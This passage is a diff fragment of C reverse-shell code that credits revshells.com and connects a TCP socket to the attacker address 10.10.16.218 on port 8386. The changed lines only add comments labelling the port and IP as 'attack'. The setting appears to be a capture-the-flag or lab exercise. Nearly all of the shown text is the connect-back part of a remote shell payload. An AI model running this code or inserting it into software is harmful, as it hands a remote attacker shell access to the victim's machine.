@@ -17,13 +17,13 @@
          code taken from https://www.revshells.com/
      */
     
-     int port = 8386;
+     int port = 8386; // port attack
      struct sockaddr_in revsockaddr;
     
      int sockt = socket(AF_INET, SOCK_STREAM, 0);
      revsockaddr.sin_family = AF_INET;       
      revsockaddr.sin_port = htons(port);
-     revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.218");
+     revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.218");  // ip attackattack
     
      connect(sockt, (struct sockaddr *) &revsockaddr, 
      sizeof(revsockaddr));
